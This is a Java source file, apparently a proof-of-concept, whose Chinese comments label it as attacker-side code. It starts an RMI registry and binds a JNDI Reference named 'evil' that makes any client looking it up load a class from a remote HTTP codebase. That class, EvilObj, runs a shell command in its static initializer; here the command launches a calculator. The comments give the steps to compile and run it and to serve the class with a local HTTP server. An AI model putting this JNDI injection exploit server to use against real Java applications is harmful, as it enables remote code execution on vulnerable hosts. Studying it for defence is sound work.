import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.NamingException;
import javax.naming.Reference;
import java.io.IOException;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

// 攻击端执行
// javac HZWJavaRMI.java
// java HZWJavaRMI
// python -m http.server 8001
public class HZWJavaRMI {
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
//        LocateRegistry.createRegistry(1099);
        LocateRegistry.createRegistry(1099);
        Registry reg = LocateRegistry.getRegistry();

        Reference ref = new Reference(
                "EvilObj",
                "EvilObj",
                "http://127.0.0.1:8002/");  // 指定rmi调用方从指定位置加载目标类
        ReferenceWrapper refW = new ReferenceWrapper(ref);
        reg.bind("evil",refW);
    }
}

class EvilObj {
    static{
        System.out.println("hello evil");
        String [] cmd={"/bin/sh","-c","kcalc"};
        try {
            Process proc =Runtime.getRuntime().exec(cmd);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}

